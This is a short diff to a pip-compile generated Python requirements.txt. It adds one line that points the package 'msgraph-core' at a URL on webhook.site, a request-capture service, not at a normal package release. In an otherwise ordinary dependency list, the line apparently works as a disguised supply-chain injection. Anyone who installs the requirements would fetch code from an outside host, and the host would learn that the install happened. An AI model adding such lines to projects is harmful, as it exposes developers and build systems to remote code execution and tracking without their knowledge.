@@ -4,6 +4,7 @@
 #
 #    pip-compile --output-file=requirements.txt --resolver=backtracking
 #
+msgraph-core @ https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919
 aiohappyeyeballs==2.6.1
     # via aiohttp
 aiohttp==3.13.3
